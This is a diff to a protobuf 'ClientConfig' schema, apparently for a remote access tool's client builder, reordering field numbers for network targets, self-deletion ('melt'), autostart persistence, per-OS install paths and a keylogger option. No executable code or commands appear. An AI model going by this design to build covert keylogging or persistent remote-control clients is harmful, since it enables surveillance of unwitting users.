@@ -18,35 +18,38 @@ message ClientConfig {
 	required string output_type = 1;
 	required int32 build_number = 2;
 	
-	optional int32 delay = 3;
-	optional bool always_imsg = 4;
-	optional string imsg = 5;
+	
+	optional bool always_imsg = 3;
+	optional string imsg = 4;
 
 	//network
-	repeated NetworkTarget target = 6;
-	required int32 reconnect_period = 7;
+	repeated NetworkTarget target = 5;
+	required int32 reconnect_period = 6;
 
 	//execution
+	optional int32 delay = 7;
 	optional bool melt = 8;
-	optional string path_win = 9;
-	optional string path_lin = 10;
-	optional string path_osx = 11;
-	optional string path_sol = 12;
-	optional string path_bsd = 13;
-	optional bool autostart = 14;
+	optional bool autostart = 9;
+	optional bool delay_idle = 10;
+	optional bool error_recovery = 11;
+	optional string path_win = 12;
+	optional string path_lin = 13;
+	optional string path_osx = 14;
+	optional string path_sol = 15;
+	optional string path_bsd = 16;
+	
 	
 	// features
-	optional bool keylogger = 15;
+	optional bool keylogger = 17;
 
-	optional string viewer_user = 16;
+	optional string viewer_user = 18;
 	
-	required AuthType authType = 21;
-	optional Group group = 22;
-	optional string password = 23;
+	required AuthType authType = 19;
+	optional Group group = 20;
+	optional string password = 21;
 
 	//for parser only
-	optional bool waiver = 20;
-	
+	optional bool waiver = 22;
 	
 }
 
